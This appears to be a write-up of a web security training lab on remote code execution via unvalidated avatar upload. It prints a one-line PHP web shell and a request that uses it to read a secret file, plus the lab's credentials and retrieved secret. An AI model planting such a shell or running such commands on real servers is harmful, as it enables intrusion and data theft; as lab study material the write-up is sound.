## Remote code execution via web shell upload

This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter

## Notes

- Possibility to leave a comment on a post
- File Upload feature on user account


## Resume

1. Login with wiener:peter
2. Upload **php** shell
3. RCE with **php** shell


## Solve 

The **file upload** feature is on `/my-account`, we have to login with wiener:peter. We can update our **Avatar** via file upload. We will upload our shell.php in order to RCE.

**shell.php**

```php
<?=`$_GET[0]`?>
```

Once it's uploaded, we can right click over our avatar and open the "image" in new tab. In order to get `/home/carlos/secret` we can use the web shell : 

`/files/avatars/shell.php?0=cat%20/home/carlos/secret` -> "Jy3gVRbAhktfeB0nB8rj8ImXcZ50t5QY"